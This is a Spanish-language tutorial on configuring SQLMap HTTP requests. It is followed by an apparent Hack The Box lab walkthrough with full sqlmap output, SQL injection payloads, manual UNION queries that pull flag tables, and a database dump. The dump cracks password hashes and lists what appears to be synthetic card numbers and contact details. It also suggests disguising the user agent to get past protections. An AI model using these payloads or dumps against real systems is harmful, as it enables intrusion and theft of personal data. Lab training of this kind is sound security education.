
# SQLMap - HTTP Request

SQLMap tiene numerosas opciones y flags que se pueden utilizar para configurar correctamente la solicitud (HTTP) antes de su uso.

En muchos casos, errores simples como olvidar proporcionar valores de cookies adecuados, complicar demasiado la configuración con una línea de comando larga o una declaración incorrecta de datos POST formateados impedirán la detección y explotación correctas de la posible vulnerabilidad de SQLi.

***

## <mark style="color:purple;">Comandos de curl</mark>

Una de las mejores y más sencillas formas de configurar correctamente una solicitud SQLMap contra el objetivo específico (es decir, una solicitud web con parámetros dentro) es utilizar la función `Copy as cURL` dentro del panel Red (Monitor) dentro de las herramientas para desarrolladores de Chrome, Edge o Firefox:

<figure><img src="https://academy.hackthebox.com/storage/modules/58/M5UVR6n.png" alt=""><figcaption></figcaption></figure>

Al pegar el contenido del portapapeles ( `Ctrl-V`) en la línea de comando y cambiar el comando original `curl` a `sqlmap`, podemos usar SQLMap con el mismo comando:

```shell-session
afsh4ck@kali$ sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'
```

Al proporcionar datos para realizar pruebas a SQLMap, debe haber un valor de parámetro que pueda evaluarse para detectar vulnerabilidades de SQLi u opciones/interruptores especializados para la búsqueda automática de parámetros (por ejemplo `--craw`, , `--forms` o `-g`).

***

## <mark style="color:purple;">Solicitudes GET/POST</mark>

En el escenario más común, los parámetros `GET` se proporcionan con el uso de la opción `-u`/ `--url`, como en el ejemplo anterior. En cuanto a los datos de prueba , se puede utilizar el indicador `POST`, de la siguiente manera: `--data`

&#x20; Ejecución de SQLMap en una solicitud HTTP

```shell-session
afsh4ck@kali$ sqlmap 'http://www.example.com/' --data 'uid=1&name=test'
```

En tales casos, se probarán los parámetros `POST` y `uid` para detectar vulnerabilidades de SQLi. Por ejemplo, si tenemos una indicación clara de que el parámetro es propenso a una vulnerabilidad de SQLi, podríamos limitar las pruebas a solo este parámetro utilizando . De lo contrario, podríamos marcarlo dentro de los datos proporcionados con el uso de un marcador especial de la siguiente manera: `nameuid-p uid*`

```shell-session
afsh4ck@kali$ sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'
```

***

## <mark style="color:purple;">Solicitudes HTTP completas</mark>

Si necesitamos especificar una solicitud HTTP compleja con muchos valores de encabezado diferentes y un cuerpo POST alargado, podemos usar el indicador `-r`. Con esta opción, SQLMap recibe el "archivo de solicitud", que contiene toda la solicitud HTTP dentro de un único archivo de texto. En un escenario común, dicha solicitud HTTP se puede capturar desde una aplicación proxy especializada (por ejemplo, `Burp`) y escribir en el archivo de solicitud, de la siguiente manera:

![solicitud de eructo](https://academy.hackthebox.com/storage/modules/58/x7ND6VQ.png)

Un ejemplo de una solicitud HTTP capturada con `Burp` se vería así:

```http
GET /?id=1 HTTP/1.1
Host: www.example.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
DNT: 1
If-Modified-Since: Thu, 17 Oct 2019 07:18:26 GMT
If-None-Match: "3147526947"
Cache-Control: max-age=0
```

Podemos copiar manualmente la solicitud HTTP desde dentro `Burp` y escribirla en un archivo, o podemos hacer click derecho en la solicitud en `Burp` y elegir `Copy to file`. Otra forma de capturar la solicitud HTTP completa sería mediante el navegador, como se mencionó anteriormente en la sección, y elegir la opción `Copy`> `Copy Request Headers`, y luego pegar la solicitud en un archivo.

Para ejecutar SQLMap con un archivo de solicitud HTTP, utilizamos el indicador `-r`, de la siguiente manera:

```shell-session
afsh4ck@kali$ sqlmap -r req.txt
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.4.9}
|_ -| . [(]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org


[*] starting @ 14:32:59 /2020-09-11/

[14:32:59] [INFO] parsing HTTP request from 'req.txt'
[14:32:59] [INFO] testing connection to the target URL
[14:32:59] [INFO] testing if the target URL content is stable
[14:33:00] [INFO] target URL content is stable
```

{% hint style="info" %}
**Consejo**: de manera similar al caso con la opción '`--data`', dentro del archivo de solicitud guardado, podemos especificar el parámetro que queremos inyectar con un asterisco (\*), como '/?id=\*'.
{% endhint %}

***

## <mark style="color:purple;">Solicitudes SQLMap personalizadas</mark>

Si quisiéramos crear solicitudes complicadas manualmente, existen numerosos modificadores y opciones para ajustar SQLMap.

Por ejemplo, si existe el requisito de especificar el valor de la cookie (de sesión), `PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c` con la opción `--cookie` se utilizaría de la siguiente manera:

```shell-session
afsh4ck@kali$ sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
```

El mismo efecto se puede lograr con el uso de la opción `-H/--header`:

```shell-session
afsh4ck@kali$ sqlmap ... -H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
```

Podemos aplicar lo mismo a opciones como `--host`, `--referer`, y `-A/--user-agent`, que se utilizan para especificar los mismos valores de encabezados HTTP.

Además, hay un interruptor `--random-agent` diseñado para seleccionar aleatoriamente un valor `User-agent` de encabezado de la base de datos incluida de valores de navegador habituales. Este es un interruptor importante que hay que recordar, ya que cada vez más soluciones de protección descartan automáticamente todo el tráfico HTTP que contenga el valor User-agent de SQLMap predeterminado reconocible (por ejemplo, `User-agent: sqlmap/1.4.9.12#dev (http://sqlmap.org)`). Alternativamente, el interruptor `--mobile` se puede utilizar para imitar el teléfono inteligente utilizando ese mismo valor de encabezado.

Si bien SQLMap, de manera predeterminada, solo se dirige a los parámetros HTTP, es posible probar los encabezados para detectar la vulnerabilidad de SQLi. La forma más fácil es especificar la marca de inyección "personalizada" después del valor del encabezado (por ejemplo, `--cookie="id=1*"`). El mismo principio se aplica a cualquier otra parte de la solicitud.

Además, si quisiéramos especificar un método HTTP alternativo, distinto de `GET`y `POST`(por ejemplo, `PUT`), podemos utilizar la opción `--method`, de la siguiente manera:

```shell-session
afsh4ck@kali$ sqlmap -u www.target.com --data='id=1' --method PUT
```

***

## <mark style="color:purple;">Solicitudes HTTP personalizadas</mark>

Además del estilo `POST` de cuerpo de datos de formulario más común (por ejemplo, `id=1`), SQLMap también admite solicitudes HTTP con formato JSON (por ejemplo `{"id":1}`, ) y XML (por ejemplo, ).`<element><id>1</id></element>`

El soporte para estos formatos se implementa de manera "relajada"; por lo tanto, no hay restricciones estrictas sobre cómo se almacenan los valores de los parámetros en el interior. En caso de que el cuerpo `POST` sea relativamente simple y corto, la opción `--data` será suficiente.

Sin embargo, en el caso de un cuerpo POST complejo o largo, podemos volver a utilizar la opción `-r`:

```shell-session
afsh4ck@kali$ cat req.txt
HTTP / HTTP/1.0
Host: www.example.com

{
  "data": [{
    "type": "articles",
    "id": "1",
    "attributes": {
      "title": "Example JSON",
      "body": "Just an example",
      "created": "2020-05-22T14:56:29.000Z",
      "updated": "2020-05-22T14:56:28.000Z"
    },
    "relationships": {
      "author": {
        "data": {"id": "42", "type": "user"}
      }
    }
  }]
}
```

```shell-session
afsh4ck@kali$ sqlmap -r req.txt
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.4.9}
|_ -| . [)]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org


[*] starting @ 00:03:44 /2020-09-15/

[00:03:44] [INFO] parsing HTTP request from 'req.txt'
JSON data found in HTTP body. Do you want to process it? [Y/n/q] 
[00:03:45] [INFO] testing connection to the target URL
[00:03:45] [INFO] testing if the target URL content is stable
[00:03:46] [INFO] testing if HTTP parameter 'JSON type' is dynamic
[00:03:46] [WARNING] HTTP parameter 'JSON type' does not appear to be dynamic
[00:03:46] [WARNING] heuristic (basic) test shows that HTTP parameter 'JSON type' might not be injectable
```

***

## Ejercicio

```
Objetivo: 94.237.59.16:50317
```

<figure><img src="/files/gyRcZAx9niOZcBK848TG" alt=""><figcaption></figcaption></figure>

### Pregunta 1

¿Cuál es el contenido de la tabla flag2? (Case #2)

<figure><img src="/files/dh99LUDb7bcsv5GvqNJf" alt=""><figcaption></figcaption></figure>

Capturamos la petición con Burpsuite, Click derecho > Copy to file.

```shell-session
afsh4ck@kali$ sqlmap -r burp.req 
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.8.4#stable}
|_ -| . [.]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 15:33:52 /2024-08-06/

[15:33:52] [INFO] parsing HTTP request from 'burp.req'
[15:33:53] [INFO] testing connection to the target URL
[15:33:53] [INFO] checking if the target is protected by some kind of WAF/IPS
[15:33:53] [INFO] testing if the target URL content is stable
[15:33:53] [INFO] target URL content is stable
[15:33:53] [INFO] testing if POST parameter 'id' is dynamic
[15:33:53] [INFO] POST parameter 'id' appears to be dynamic
[15:33:53] [INFO] heuristic (basic) test shows that POST parameter 'id' might be injectable (possible DBMS: 'MySQL')
[15:33:53] [INFO] heuristic (XSS) test shows that POST parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks
[15:33:53] [INFO] testing for SQL injection on POST parameter 'id'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] y
[15:34:13] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[15:34:13] [WARNING] reflective value(s) found and filtering out
[15:34:14] [INFO] POST parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="Rice")
[15:34:14] [INFO] testing 'Generic inline queries'
[15:34:14] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[15:34:14] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[15:34:14] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[15:34:14] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[15:34:14] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'                                                                                                             
[15:34:14] [WARNING] potential permission problems detected ('command denied')
[15:34:14] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[15:34:14] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'                                                                                                             
[15:34:14] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[15:34:15] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[15:34:15] [INFO] POST parameter 'id' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable                                                                                         
[15:34:15] [INFO] testing 'MySQL inline queries'
[15:34:15] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[15:34:15] [WARNING] time-based comparison requires larger statistical model, please wait........... (done)    
[15:34:26] [INFO] POST parameter 'id' appears to be 'MySQL >= 5.0.12 stacked queries (comment)' injectable 
[15:34:26] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[15:34:36] [INFO] POST parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[15:34:36] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[15:34:36] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[15:34:36] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[15:34:37] [INFO] target URL appears to have 9 columns in query
[15:34:37] [INFO] POST parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
POST parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
sqlmap identified the following injection point(s) with a total of 42 HTTP(s) requests:
---
Parameter: id (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 1257=1257

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1 AND (SELECT 5697 FROM(SELECT COUNT(*),CONCAT(0x71707a7871,(SELECT (ELT(5697=5697,1))),0x7170707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
    
    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: id=1;SELECT SLEEP(5)#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 6492 FROM (SELECT(SLEEP(5)))xLwK)

    Type: UNION query
    Title: Generic UNION query (NULL) - 9 columns
    Payload: id=1 UNION ALL SELECT NULL,NULL,CONCAT(0x71707a7871,0x774d435564484262584e7142444e686151506a704e6469574b567a6b6a7865446667634546546d4d,0x7170707671),NULL,NULL,NULL,NULL,NULL,NULL-- -
---
[15:34:48] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[15:34:48] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/94.237.59.16'

[*] ending @ 15:34:48 /2024-08-06/

```

#### Enumerar los nombres de las tablas:

{% code overflow="wrap" %}

```
id=1 UNION ALL SELECT NULL,NULL,table_name,NULL,NULL,NULL,NULL,NULL,NULL FROM information_schema.tables WHERE table_schema=DATABASE()-- -
```

{% endcode %}

<figure><img src="/files/V9SeyIeolXmBM6eVyYKk" alt=""><figcaption></figcaption></figure>

#### Obtener las columnas de la tabla flag2:

{% code overflow="wrap" %}

```
id=1 UNION ALL SELECT NULL,NULL,column_name,NULL,NULL,NULL,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='flag2'-- -
```

{% endcode %}

<figure><img src="/files/dGyG11wJG93KMxsSlT4q" alt=""><figcaption></figcaption></figure>

#### Consulta de la columna content:

{% code overflow="wrap" %}

```http
id=1 UNION ALL SELECT NULL,NULL,content,NULL,NULL,NULL,NULL,NULL,NULL FROM flag2-- -
```

{% endcode %}

<figure><img src="/files/QndX64NifAEcZQQSF1gp" alt=""><figcaption></figcaption></figure>

### Pregunta 2

¿Cuál es el contenido de la tabla flag3? (Case #3)

<figure><img src="/files/vkehhxjQQ2TRXja07toK" alt=""><figcaption></figcaption></figure>

Vamos a usar otra técnica para hacer un dump de la base de datos, y indicarle el parámetro inyectable '`id=1*`':

{% hint style="warning" %}
**Nota**: Importante introducir el asterisco para indicarle el parámetro inyectable
{% endhint %}

```bash
sqlmap -u http://94.237.59.16:50317/case3.php --cookie='id=1*' --dump --batch
        ___
       __H__                                                                                
 ___ ___[']_____ ___ ___  {1.8.4#stable}                                                    
|_ -| . [']     | .'| . |                                                                   
|___|_  [)]_|_|_|__,|  _|                                                                   
      |_|V...       |_|   https://sqlmap.org                                                

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 16:23:19 /2024-08-06/

custom injection marker ('*') found in option '--headers/--user-agent/--referer/--cookie'. Do you want to process it? [Y/n/q] Y
[16:23:19] [INFO] testing connection to the target URL
[16:23:20] [INFO] testing if the target URL content is stable
[16:23:20] [INFO] target URL content is stable
[16:23:20] [INFO] testing if (custom) HEADER parameter 'Cookie #1*' is dynamic
do you want to URL encode cookie values (implementation specific)? [Y/n] Y
[16:23:20] [INFO] (custom) HEADER parameter 'Cookie #1*' appears to be dynamic
[16:23:20] [INFO] heuristic (basic) test shows that (custom) HEADER parameter 'Cookie #1*' might be injectable (possible DBMS: 'MySQL')
[16:23:20] [INFO] heuristic (XSS) test shows that (custom) HEADER parameter 'Cookie #1*' might be vulnerable to cross-site scripting (XSS) attacks
[16:23:20] [INFO] testing for SQL injection on (custom) HEADER parameter 'Cookie #1*'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[16:23:20] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[16:23:20] [WARNING] reflective value(s) found and filtering out
[16:23:20] [INFO] (custom) HEADER parameter 'Cookie #1*' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="Rice")                             
[16:23:20] [INFO] testing 'Generic inline queries'
[16:23:20] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'                                                                 
[16:23:21] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'                                                                                      
[16:23:21] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'                                                                             
[16:23:21] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[16:23:21] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'                                                                     
[16:23:21] [WARNING] potential permission problems detected ('command denied')
[16:23:21] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'                                                                                          
[16:23:21] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'                                                                     
[16:23:21] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'                                                                                          
[16:23:21] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'                                                                           
[16:23:21] [INFO] (custom) HEADER parameter 'Cookie #1*' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable                              
[16:23:21] [INFO] testing 'MySQL inline queries'
[16:23:21] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[16:23:21] [WARNING] time-based comparison requires larger statistical model, please wait........... (done)
[16:23:32] [INFO] (custom) HEADER parameter 'Cookie #1*' appears to be 'MySQL >= 5.0.12 stacked queries (comment)' injectable 
[16:23:32] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[16:23:42] [INFO] (custom) HEADER parameter 'Cookie #1*' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[16:23:42] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[16:23:42] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[16:23:42] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[16:23:42] [INFO] target URL appears to have 9 columns in query
[16:23:43] [INFO] (custom) HEADER parameter 'Cookie #1*' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
(custom) HEADER parameter 'Cookie #1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 42 HTTP(s) requests:
---
Parameter: Cookie #1* ((custom) HEADER)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 7159=7159

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1 AND (SELECT 1725 FROM(SELECT COUNT(*),CONCAT(0x7178717a71,(SELECT (ELT(1725=1725,1))),0x71766b7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: id=1;SELECT SLEEP(5)#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 6705 FROM (SELECT(SLEEP(5)))pcJr)

    Type: UNION query
    Title: Generic UNION query (NULL) - 10 columns
    Payload: id=1 UNION ALL SELECT NULL,NULL,CONCAT(0x7178717a71,0x646d676b724a574c436646456e566d7566624d4d7853465a614e474e6873656f434c486d4f6d4b46,0x71766b7871),NULL,NULL,NULL,NULL,NULL,NULL-- -
---
[16:23:43] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[16:23:43] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[16:23:43] [INFO] fetching current database
[16:23:43] [INFO] fetching tables for database: 'testdb'
[16:23:43] [INFO] fetching columns for table 'users' in database 'testdb'
[16:23:43] [INFO] fetching entries for table 'users' in database 'testdb'
[16:23:43] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
do you want to crack them via a dictionary-based attack? [Y/n/q] Y
[16:23:43] [INFO] using hash method 'sha1_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
[16:23:43] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] N
[16:23:43] [INFO] starting dictionary-based cracking (sha1_generic_passwd)
[16:23:43] [INFO] starting 4 processes 
[16:23:43] [INFO] cracked password '05adrian' for hash '70f361f8a1c9035a1d972a209ec5e8b726d1055e'
[16:23:43] [INFO] cracked password '1201Hunt' for hash 'df692aa944eb45737f0b3b3ef906f8372a3834e9'
[16:23:43] [INFO] cracked password '1955chev' for hash 'aed6d83bab8d9234a97f18432cd9a85341527297'
[16:23:43] [INFO] cracked password '3052' for hash '9a0f092c8d52eaf3ea423cef8485702ba2b3deb9'
[16:23:44] [INFO] cracked password 'Enizoom1609' for hash 'd642ff0feca378666a8727947482f1a4702deba0'
[16:23:44] [INFO] cracked password 'actionteam' for hash '520df62660b18e571c7cb3b5d3f559b8a8ff0d4b'
[16:23:44] [INFO] cracked password 'Zc1uowqg6' for hash '0ff476c2676a2e5f172fe568110552f2e910c917'
[16:23:44] [INFO] cracked password 'breakout' for hash 'ef6896ab2d5a3c6e8ba7ee46ba3e48c29057ad74'
[16:23:44] [INFO] cracked password 'aza221p' for hash '6725c7bee76ccdb7eda15fa263908988115498a9'
[16:23:44] [INFO] cracked password 'exquisite' for hash 'c7fbcdaf308cdcd64504d46342e7c79959388c44'
[16:23:44] [INFO] cracked password 'donatus' for hash '20021ffbd3be7a3cddc64812d5dd6e5afb6e760c'
[16:23:44] [INFO] cracked password 'hibiskus' for hash 'a5e68cd37ce8ec021d5ccb9392f4980b3c8b3295'
[16:23:44] [INFO] cracked password 'ford1900' for hash 'f2d897eb3bae0f1fd396325deb3c4779ae1d586d'
[16:23:45] [INFO] cracked password 'hjungpil1' for hash '4282cfe7697817374251bc17aa47de6f620586b5'
[16:23:45] [INFO] cracked password 'homerhound' for hash 'c418f9859f9d85e9c7e1eadd8c512cf7ddf4d16b'
[16:23:45] [INFO] cracked password 'mike230040' for hash '65b136cb1ec4b88f709f8f510262720eddfa71a7'
[16:23:45] [INFO] cracked password 'millisa34' for hash '608e6d07cc8ce20bfdaf9c72ef420ad691de32cb'
[16:23:45] [INFO] cracked password 'nike92' for hash '2e0488a09433aa0d67b3463c76f407c7b0388ad7'
[16:23:45] [INFO] cracked password 'morswin2' for hash '8203b1bf12aba49d7566ff7007b60d1c0a439bee'
[16:23:45] [INFO] cracked password 'plasid' for hash '15ce1871a907e8265f00defa21a723e7a4d35267'
[16:23:45] [INFO] cracked password 'rohaniah' for hash '4bf1926f7bb7ae283e1390236fd4a8737209862e'
[16:23:45] [INFO] cracked password 'raided' for hash '2b89b43b038182f67a8b960611d73e839002fbd9'
[16:23:45] [INFO] cracked password 'melek200215' for hash '5635e59941510dc473fbeed046c43007f76cfe03'
[16:23:45] [INFO] cracked password 'sk8ter58' for hash '3d8f48ab8e119dd813a449f6bfcf42abae63567b'
[16:23:45] [INFO] cracked password 'tarablinda' for hash '9987f0c165bc62eb3ee3db17967fbb81c026c197'
[16:23:45] [INFO] cracked password 'vptwo0gc' for hash '21549a28300f72442b132d06d4016de606f36627'
[16:23:45] [INFO] cracked password 'sgreen4eva' for hash '41244ab550c182b3ebe2dce87065bf363d0e013e'
[16:23:45] [INFO] cracked password 'spiderpig8574376' for hash 'b7fbde78b81f7ad0b8ce0cc16b47072a6ea5f08e'
[16:23:45] [INFO] cracked password 'ssival47' for hash 'f5eb0fbdd88524f45c7c67d240a191163a27184b'
Database: testdb                                                                           
Table: users
[32 entries]
+----+------------------+-----------------------------+--------------+-------------------+------------------------+-------------------+-------------------------------------------------------------+---------------------------------------------------+
| id | cc               | email                       | phone        | name              | address                | birthday          | password                                                    | occupation                                        |
+----+------------------+-----------------------------+--------------+-------------------+------------------------+-------------------+-------------------------------------------------------------+---------------------------------------------------+
| 1  | 5387278172507117 | MaynardMRice@yahoo.com      | 281-559-0172 | Maynard Rice      | 1698 Bird Spring Lane  | March 1 1958      | 9a0f092c8d52eaf3ea423cef8485702ba2b3deb9 (3052)             | Linemen                                           |
| 2  | 4539475107874477 | JulioWThomas@gmail.com      | 973-426-5961 | Julio Thomas      | 1207 Granville Lane    | February 14 1972  | 10946aa229a6d569f226976b22ea0e900a1fc219                    | Agricultural product sorter                       |
| 3  | 4716522746974567 | KennethTMaloney@gmail.com   | 954-617-0424 | Kenneth Maloney   | 2811 Kenwood Place     | May 14 1989       | a5e68cd37ce8ec021d5ccb9392f4980b3c8b3295 (hibiskus)         | General and operations manager                    |
| 4  | 4929811432072262 | GregoryBStumbaugh@yahoo.com | 410-680-5653 | Gregory Stumbaugh | 1641 Marshall Street   | May 7 1936        | b7fbde78b81f7ad0b8ce0cc16b47072a6ea5f08e (spiderpig8574376) | Foreign language interpreter                      |
| 5  | 4539646911423277 | BobbyJGranger@gmail.com     | 212-696-1812 | Bobby Granger     | 4510 Shinn Street      | December 22 1939  | aed6d83bab8d9234a97f18432cd9a85341527297 (1955chev)         | Medical records and health information technician |
| 6  | 5143241665092174 | KimberlyMWright@gmail.com   | 440-232-3739 | Kimberly Wright   | 3136 Ralph Drive       | June 18 1972      | d642ff0feca378666a8727947482f1a4702deba0 (Enizoom1609)      | Electrologist                                     |
| 7  | 5503989023993848 | DeanLHarper@yahoo.com       | 440-847-8376 | Dean Harper       | 3766 Flynn Street      | February 3 1974   | 2b89b43b038182f67a8b960611d73e839002fbd9 (raided)           | Store detective                                   |
| 8  | 4556586478396094 | GabrielaRWaite@msn.com      | 732-638-1529 | Gabriela Waite    | 2459 Webster Street    | December 24 1965  | f5eb0fbdd88524f45c7c67d240a191163a27184b (ssival47)         | Telephone station installer                       |
| 9  | 5452466713512742 | RoySCarr@msn.com            | 408-848-6272 | Roy Carr          | 1384 Sycamore Street   | October 19 1942   | 9987f0c165bc62eb3ee3db17967fbb81c026c197 (tarablinda)       | Freight, stock, and material mover                |
| 10 | 5231550277906388 | AlfonzoGWilliams@gmail.com  | 740-546-1581 | Alfonzo Williams  | 911 Irving Road        | July 16 1931      | c418f9859f9d85e9c7e1eadd8c512cf7ddf4d16b (homerhound)       | Outside order clerk                               |
| 11 | 5224197138746170 | ChristopherHBrown@yahoo.com | 917-840-2535 | Christopher Brown | 2246 Settlers Lane     | March 29 1951     | 608e6d07cc8ce20bfdaf9c72ef420ad691de32cb (millisa34)        | Unlicensed assistive personnel                    |
| 12 | 4485150912665782 | AudreyRHill@gmail.com       | 717-308-3644 | Audrey Hill       | 2306 Stout Street      | July 19 1969      | 8203b1bf12aba49d7566ff7007b60d1c0a439bee (morswin2)         | Mail processor                                    |
| 13 | 4716071391111521 | RyanMSpencer@msn.com        | 256-441-1530 | Ryan Spencer      | 4309 Turnpike Drive    | July 3 1979       | ef6896ab2d5a3c6e8ba7ee46ba3e48c29057ad74 (breakout)         | Claims representative                             |
| 14 | 4716242999773281 | JessieJSchwan@yahoo.com     | 989-217-2111 | Jessie Schwan     | 1285 Wood Street       | October 28 1937   | 520df62660b18e571c7cb3b5d3f559b8a8ff0d4b (actionteam)       | Network and computer systems administrator        |
| 15 | 5183997232057997 | ShannonRStewart@yahoo.com   | 828-850-2133 | Shannon Stewart   | 1596 Watson Lane       | May 28 1934       | 2e0488a09433aa0d67b3463c76f407c7b0388ad7 (nike92)           | Sketch artist                                     |
| 16 | 4556164708532886 | MarkLStilwell@msn.com       | 715-392-4649 | Mark Stilwell     | 121 Abner Road         | September 1 1950  | 21549a28300f72442b132d06d4016de606f36627 (vptwo0gc)         | Occupational therapist assistant                  |
| 17 | 4485731897297327 | AnnetteDGill@yahoo.com      | 216-376-3062 | Annette Gill      | 4999 Glenwood Avenue   | August 19 1977    | 0ff476c2676a2e5f172fe568110552f2e910c917 (Zc1uowqg6)        | Plate finisher                                    |
